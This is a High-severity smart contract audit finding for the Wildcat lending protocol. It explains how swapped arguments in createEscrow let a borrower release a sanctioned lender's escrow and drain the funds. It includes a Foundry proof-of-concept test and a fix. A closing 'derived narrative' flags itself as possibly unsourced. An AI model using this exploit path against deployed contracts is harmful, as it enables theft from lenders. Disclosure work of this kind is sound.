---
id: 19456
severity: "High"
---

# Borrower can drain all funds of a sanctioned lender

## Description

The `WildcatMarketBase#_blockAccount()` function that is used to block a sanctioned lender contains a critical bug. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentally creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.

The execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the `accountAddress` is sanctioned and if it is, then escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order.

That means whether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.

## Proof of Concept

Consider this scenario to illustrate how the issue can be exploited:

  1. Bob The Borrower creates a market.
  2. Bob authorizes Larry The Lender as a lender in the created market.
  3. Larry deposits funds into the market.
  4. Larry gets sanctioned in Chainalysis.
  5. Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry’s market tokens are transferred.
  6. Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)`.
  7. Bob initiates a withdrawal using `WildcatMarket#queueWithdrawal()`.
  8. After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` and gains access to all of Larry’s assets.

Now, let’s delve into the specifics and mechanics of the vulnerability:

The `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry’s account, creating an escrow, and transferring his market tokens to that escrow.
```solidity
    //@audit                                                     Larry
    //@audit                                                       â†“
    function _blockAccount(MarketState memory state, address accountAddress) internal {
      Account memory account = _accounts[accountAddress];
      // ...
      account.approval = AuthRole.Blocked;
      // ...
      account.scaledBalance = 0;
      address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
    	accountAddress, //@audit â† Larry
    	borrower,       //@audit â† Bob
    	address(this)
      );
      // ...
      _accounts[escrow].scaledBalance += scaledBalance;
      // ...
    }
```

In the code snippet, notice the order of arguments passed to `createEscrow()`:
```solidity
    createEscrow(accountAddress, borrower, address(this));
```

However, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:
```solidity
    function createEscrow(
    	address borrower, //@audit â† Larry
    	address account,  //@audit â† Bob
    	address asset
    ) public override returns (address escrowContract) {
      // ...
      // @audit                        ( Larry  ,   Bob  , asset)
      // @audit                            â†“         â†“       â†“
      tmpEscrowParams = TmpEscrowParams(borrower, account, asset);
      new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();
      // ...
    }
```

The `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:
```solidity
    constructor() {
      sentinel = msg.sender;  
      (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();
    //     â†‘        â†‘       â†‘   
    //(  Larry ,   Bob  , asset) are the params fetched here. @audit
    }
```

However, due to the misordered arguments in `_blockAccount()`, what’s passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert.
```solidity
    function canReleaseEscrow() public view override returns (bool) {
    	//@audit                                                 Larry      Bob
    	//                                                         â†“         â†“
    	return !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);
    }
```

The misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.
```solidity
    //@audit                       Larry              Bob
    //                               â†“                 â†“
    function isSanctioned(address borrower, address account) public view override returns (bool) {
     return
       !sanctionOverrides[borrower][account] && // true
       IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false
    }
```

Thus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry’s market tokens:
```solidity
    function releaseEscrow() public override {
      if (!canReleaseEscrow()) revert CanNotReleaseEscrow();

      uint256 amount = balance();

      //@audit                 Bob   Larry's $
      //                        â†“       â†“
      IERC20(asset).transfer(account, amount);

      emit EscrowReleased(account, asset, amount);
    }
```

After this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.

Below is a PoC demonstrating how to execute the exploit. To proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:
```solidity
    import 'src/WildcatSanctionsEscrow.sol';

    import "forge-std/console2.sol";
```

Add the following test `test/market/WildcatMarketConfig.t.sol` as well:
```solidity
    function test_borrowerCanStealSanctionedLendersFunds() external {
      vm.label(borrower, "bob"); // Label borrower for better trace readability

      // This is Larry The Lender
      address larry = makeAddr("larry");

      // Larry deposists 10e18 into Bob's market
      _deposit(larry, 10e18);

      // Larry's been a bad guy and gets sanctioned
      sanctionsSentinel.sanction(larry);

      // Larry gets nuked by the borrower
      vm.prank(borrower);
      market.nukeFromOrbit(larry);

      // The vulnerable escrow in which Larry's funds get moved
      address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));
      vm.label(vulnerableEscrow, "vulnerableEscrow");

      // Ensure Larry's funds have been moved to his escrow
      assertEq(market.balanceOf(larry), 0);
      assertEq(market.balanceOf(vulnerableEscrow), 10e18);

      // Malicious borrower is able to release the escrow due to the vulnerability
      vm.prank(borrower);
      WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();

      // Malicious borrower has all of Larry's tokens
      assertEq(market.balanceOf(borrower), 10e18);

      // The borrower authorizes himself as a lender in the market
      _authorizeLender(borrower);

      // Queue withdrawal of all funds
      vm.prank(borrower);
      market.queueWithdrawal(10e18);

      // Fast-forward to when the batch duration expires
      fastForward(parameters.withdrawalBatchDuration);
      uint32 expiry = uint32(block.timestamp);

      // Execute the withdrawal
      market.executeWithdrawal(borrower, expiry);

      // Assert the borrower has drained all of Larry's assets
      assertEq(asset.balanceOf(borrower), 10e18);
    }
```

Run the PoC like this:
```
    forge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv
```

## Recommendation

Fix the order of parameters in `WildcatSanctionsSentinel#createEscrow(borrower, account, asset)`:
```solidity
      function createEscrow(
    -   address borrower,
    +   address account,
    -   address account,
    +   address borrower,
        address asset
      ) public override returns (address escrowContract) {
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a logic error in the way a sanctions escrow is created when a lender is blocked for sanctions. When the market’s internal _blockAccount routine calls the external WildcatSanctionsSentinel.createEscrow function, it passes the arguments in the order (account, borrower, asset) while the sentinel contract expects (borrower, account, asset). This mismatch swaps the identities of the sanctioned lender and the market borrower inside the escrow’s temporary parameters. As a result, the escrow’s canReleaseEscrow check queries the sentinel to see whether the borrower (who is not sanctioned) is blocked, which returns false, allowing the escrow to be released immediately. The borrower can then call releaseEscrow, which transfers the entire balance that originally belonged to the sanctioned lender to the borrower’s address. The flaw is triggered whenever a lender is marked as sanctioned and the market’s nukeFromOrbit (or any function that blocks the account) is invoked. From the user’s point of view the sanctioned lender sees their market token balance drop to zero and is unable to retrieve it even after the sanction is lifted, while the borrower suddenly gains a large amount of tokens and can withdraw the underlying assets. The impact is a complete loss of funds for the affected lender and an unauthorized gain for the borrower, effectively allowing fund theft. The issue was uncovered during a Code4rena audit by inspecting the parameter ordering in the escrow creation call and observing that the escrow’s release logic behaved incorrectly. It is difficult to notice because the escrow contract is created successfully and the sanction check appears to pass, masking the swapped roles. The proper remediation is to align the argument order between the market’s _blockAccount function and the sentinel’s createEscrow interface, ensuring that the borrower and account parameters are passed in the correct positions, or to modify the sentinel to accept the current ordering. Conceptually, the fix restores the intended invariant that only a sanctioned account’s escrow can be released after the sanction is cleared, preventing the borrower from draining the lender’s funds.
